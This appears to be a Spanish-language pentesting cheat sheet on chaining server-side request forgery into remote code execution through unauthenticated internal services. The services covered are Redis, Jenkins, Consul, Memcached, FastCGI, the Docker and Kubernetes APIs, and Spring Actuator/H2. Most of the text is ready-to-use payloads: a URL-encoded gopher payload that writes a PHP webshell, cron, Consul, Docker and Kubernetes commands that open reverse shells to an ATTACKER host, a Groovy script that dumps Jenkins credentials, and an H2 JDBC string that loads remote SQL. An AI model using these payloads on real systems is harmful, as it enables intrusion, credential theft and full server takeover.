# SSRF → RCE

SSRF por sí solo da acceso de lectura a la red interna. Para escalar a RCE hay que combinar el SSRF con servicios internos que ejecuten comandos, permitan escritura de archivos, o tengan funcionalidades de administración explotables.

```
SSRF (lectura de red interna)
    ↓
Servicio interno sin auth / panel admin accesible
    ↓
RCE / escritura de archivos / credenciales
    ↓
Control del servidor
```

### Redis sin autenticación - RCE

Redis es el objetivo más frecuente. Sin contraseña, un atacante con acceso de red puede ejecutar comandos Redis arbitrarios que permiten múltiples vías hacia RCE.

#### Via SSRF con protocolo gopher://

El protocolo `gopher://` permite enviar datos TCP arbitrarios. Con él se pueden enviar comandos Redis directamente.

```bash
# Formato gopher para Redis:
# gopher://HOST:PORT/_COMANDOS_URL_ENCODED
# Los comandos Redis usan el protocolo RESP:
# *N\r\n$LEN\r\nARGUMENTO\r\n...

# Generar payloads gopher para Redis:
# Herramienta: Gopherus (automatiza la generación)
python3 gopherus.py --exploit redis

# Payload manual — Redis FLUSHALL + SET + CONFIG para webshell PHP:
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A%2Fvar%2Fwww%2Fhtml%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

# Esto ejecuta en Redis:
# FLUSHALL
# SET 1 "\n\n<?php system($_GET['cmd']); ?>\n\n"
# CONFIG SET dir /var/www/html
# CONFIG SET dbfilename shell.php
# SAVE
# → Escribe shell.php en el webroot
```

#### Via Redis — Inyección de cron job

```bash
# Paso 1: Via SSRF con gopher, ejecutar en Redis:
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET payload "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/9001 0>&1\n\n"
SAVE
# → Cada minuto se ejecuta la reverse shell como root (si Redis corre como root)

# Generado con Gopherus:
python3 gopherus.py --exploit redis
# Seleccionar: RCE via Cron job
# Introducir: bash -i >& /dev/tcp/ATTACKER/9001 0>&1
```

#### Via Redis — Inyección de clave SSH autorizada

```bash
# Paso 1: Generar par de claves SSH
ssh-keygen -t rsa -f /tmp/ssrf_key

# Paso 2: Via SSRF gopher, escribir clave pública en Redis
# y configurar Redis para guardar en /root/.ssh/
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET payload "\n\nssh-rsa AAAA... attacker@evil.com\n\n"
SAVE

# Paso 3: Conectar vía SSH
ssh -i /tmp/ssrf_key root@TARGET

# Con Gopherus:
python3 gopherus.py --exploit redis
# Seleccionar: RCE via SSH public key
```

#### Gopherus — Generar payloads automáticamente

```bash
# Instalación
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus && pip3 install -r requirements.txt

# Redis → Webshell PHP
python3 gopherus.py --exploit redis
# Opciones:
# 1) PHPShell
# 2) CronJob
# 3) SSHPublicKey
# 4) PyShell
# → Genera URL gopher lista para usar en el SSRF

# FastCGI → RCE
python3 gopherus.py --exploit fastcgi
# Introducir: /var/www/html/index.php (o cualquier PHP existente)
# Comando: id
# → Genera payload gopher para FastCGI

# Memcached → Inyección
python3 gopherus.py --exploit memcache
# → Puede inyectar en sesiones de PHP
```

### Jenkins - RCE via Groovy Console

Jenkins tiene una consola Groovy que ejecuta código en el servidor. Si Jenkins está en localhost sin autenticación (frecuente en setups internos), SSRF da RCE directo.

#### Acceder al panel

```bash
# Via SSRF — acceder a Jenkins
http://127.0.0.1:8080/
http://127.0.0.1:8080/manage
http://127.0.0.1:8080/script          # ← Groovy console = RCE

# Verificar si requiere autenticación
http://127.0.0.1:8080/api/json        # Sin auth si Jenkins está sin seguridad
```

#### Groovy Console → RCE

```groovy
// Via SSRF POST al endpoint /script
// Payload Groovy para ejecutar comandos:

// Comando simple
def cmd = "id".execute()
println cmd.text

// Comando con argumentos
def cmd = ["bash", "-c", "id"].execute()
println cmd.text

// Reverse shell
def cmd = ["bash", "-c", "bash -i >& /dev/tcp/ATTACKER/9001 0>&1"].execute()
cmd.waitFor()

// Leer archivos
println new File("/etc/passwd").text

// Listar directorio
new File("/").eachFile { println it }
```

```bash
# Via SSRF con POST al endpoint /script
# Si la app SSRF permite POST con body:
url=http://127.0.0.1:8080/script
method=POST
body=script=def+cmd+%3D+%22id%22.execute()%0aprintln+cmd.text

# Con curl para testear si hay acceso al panel
curl -s -X POST http://127.0.0.1:8080/script \
    --data-urlencode 'script=def cmd = "id".execute(); println cmd.text'
```

#### Jenkins API sin autenticación

```bash
# Enumerar jobs y builds
http://127.0.0.1:8080/api/json?tree=jobs[name,url,builds[number,result]]

# Ver credenciales almacenadas en Jenkins
http://127.0.0.1:8080/credentials/
http://127.0.0.1:8080/credentials/store/system/domain/_/

# Exportar credenciales via Groovy
// En la consola Groovy:
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
import jenkins.model.Jenkins

Jenkins.instance.getAllItems().each { job ->
    CredentialsProvider.lookupCredentials(
        StandardUsernamePasswordCredentials.class, job, null, null
    ).each { cred ->
        println "Job: ${job.name} | User: ${cred.username} | Pass: ${cred.password}"
    }
}
```

### Consul → RCE via Script Check

HashiCorp Consul permite registrar health checks que ejecutan scripts del sistema. Si la API está accesible sin autenticación, se puede registrar un servicio con un script malicioso.

```bash
# Verificar acceso
http://127.0.0.1:8500/v1/agent/self
http://127.0.0.1:8500/v1/catalog/services

# Registrar servicio con script check malicioso
# Via SSRF con POST:
PUT/POST http://127.0.0.1:8500/v1/agent/service/register
Content-Type: application/json
Body:
{
    "ID": "malicious",
    "Name": "malicious",
    "Address": "127.0.0.1",
    "Port": 80,
    "check": {
        "DeregisterCriticalServiceAfter": "90m",
        "Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER/9001 0>&1"],
        "Interval": "10s",
        "Timeout": "86400s"
    }
}

# El check se ejecuta como el usuario que corre Consul (a veces root)
# También se puede usar para escribir webshell:
"Args": ["/bin/bash", "-c", "echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php"]
```

### Memcached → Envenenamiento de sesión PHP → RCE indirecto

```bash
# Si PHP usa Memcached para almacenar sesiones y Memcached no tiene auth

# Via gopher, inyectar en la sesión de PHP:
# Formato Memcached: "set KEY FLAGS EXPTIME BYTES\r\nVALUE\r\n"

# Generado con Gopherus:
python3 gopherus.py --exploit memcache

# Payload: inyectar PHP serializado en la sesión
# Si hay un parámetro de unserialización → RCE via gadget chain

# Más común: inyectar contenido que se refleja en la app sin escape → XSS o bypass de auth
gopher://127.0.0.1:11211/_%0d%0aset%20SESSION_ID%200%200%2016%0d%0aa:1:{s:4:"role";s:5:"admin";}%0d%0a
# → La sesión del usuario X ahora tiene role=admin
```

### FastCGI (9000) - RCE

FastCGI es un protocolo que los servidores web usan para comunicarse con intérpretes (PHP-FPM). Si el puerto 9000 está accesible, se puede ejecutar cualquier archivo PHP con parámetros arbitrarios.

```bash
# Verificar que FastCGI está en el puerto 9000
http://127.0.0.1:9000/  → probablemente no responde a HTTP

# Via gopher, enviar petición FastCGI:
python3 gopherus.py --exploit fastcgi
# Introducir ruta de un PHP existente: /var/www/html/index.php
# Comando a ejecutar: id

# El payload gopher resultante ejecuta PHP con el PHP_VALUE:
# PHP_VALUE: auto_prepend_file = php://input
# Con PHP_ADMIN_VALUE: allow_url_include = On
# → Ejecuta código PHP arbitrario en el contexto del proceso PHP-FPM
```

### Docker API sin TLS (2375) → RCE

```bash
# Verificar acceso
http://127.0.0.1:2375/version
http://127.0.0.1:2375/containers/json

# Crear contenedor con el filesystem del host montado:
# POST http://127.0.0.1:2375/containers/create
{
    "Image": "alpine",
    "Cmd": ["chroot", "/host", "bash", "-c", "bash -i >& /dev/tcp/ATTACKER/9001 0>&1"],
    "Binds": ["/:/host"],
    "Privileged": true
}

# POST http://127.0.0.1:2375/containers/CONTAINER_ID/start
# → El contenedor monta el filesystem del host y ejecuta el comando como root en el host

# Escribir webshell en el host via Docker:
"Cmd": ["/bin/sh", "-c", "echo '<?php system($_GET[cmd]);?>' > /host/var/www/html/shell.php"]

# Con curl (para verificar):
curl -s http://127.0.0.1:2375/containers/json
curl -X POST http://127.0.0.1:2375/containers/create -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["id"],"Binds":["/:/host"],"Privileged":true}'
```

### Kubernetes API → RCE via Pod

```bash
# Si la API de Kubernetes está accesible sin auth (misconfiguration)
https://10.96.0.1:6443/api/v1/namespaces/default/pods

# Crear un pod privilegiado que ejecute comandos en el nodo:
# POST https://10.96.0.1:6443/api/v1/namespaces/default/pods
{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "attacker-pod"},
    "spec": {
        "containers": [{
            "name": "pwn",
            "image": "alpine",
            "command": ["sh", "-c", "chroot /host bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'"],
            "volumeMounts": [{"name": "host", "mountPath": "/host"}],
            "securityContext": {"privileged": true}
        }],
        "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
    }
}
```

***

### Spring Boot Actuator → RCE via jolokia o h2-console

```bash
# /actuator/env → variables de entorno con credenciales
http://127.0.0.1:8080/actuator/env

# /actuator/jolokia → expone JMX via HTTP → RCE en versiones antiguas
http://127.0.0.1:8080/actuator/jolokia/list
# Via jolokia, cargar ClassPath remoto con código malicioso

# /h2-console → H2 in-memory database console → RCE via JDBC
http://127.0.0.1:8080/h2-console
# Configurar JDBC URL: jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://ATTACKER/exploit.sql'
# exploit.sql: CREATE ALIAS EXEC AS $$ void exec(String cmd) throws Exception { Runtime.getRuntime().exec(cmd); }$$; CALL EXEC('id');

# /actuator/gateway (Spring Cloud Gateway) → SSRF adicional via SpEL injection
# Ver CVE-2022-22947
```

***

### Resumen de cadenas SSRF → RCE

| Servicio        | Puerto | Protocolo | Vía de RCE                                        |
| --------------- | ------ | --------- | ------------------------------------------------- |
| Redis sin auth  | 6379   | gopher:// | Config SET dir + SAVE → webshell / cron / SSH key |
| Jenkins         | 8080   | http://   | /script → Groovy console                          |
| Consul          | 8500   | http://   | Register service with script check                |
| Memcached       | 11211  | gopher:// | Envenenamiento de sesión PHP                      |
| FastCGI/PHP-FPM | 9000   | gopher:// | Ejecutar PHP con auto\_prepend\_file              |
| Docker API      | 2375   | http://   | Crear contenedor privilegiado con host mount      |
| Kubernetes API  | 6443   | https://  | Crear pod privilegiado con host mount             |
| H2 Console      | 8080   | http://   | JDBC URL con RUNSCRIPT                            |

> Redis con Gopherus es la cadena SSRF → RCE más documentada y efectiva. Si hay Redis sin autenticación en localhost, con un solo payload gopher se puede obtener webshell o reverse shell.

> Jenkins sin auth en puerto 8080 interno es casi tan frecuente como Redis en entornos DevOps. El endpoint `/script` da RCE directo con Groovy sin ninguna condición adicional.

> Las cadenas que implican `gopher://` requieren que la librería HTTP del servidor (libcurl, urllib, etc.) soporte ese protocolo. Verificar primero con `gopher://attacker.com/test` via Interactsh antes de enviar el payload completo.
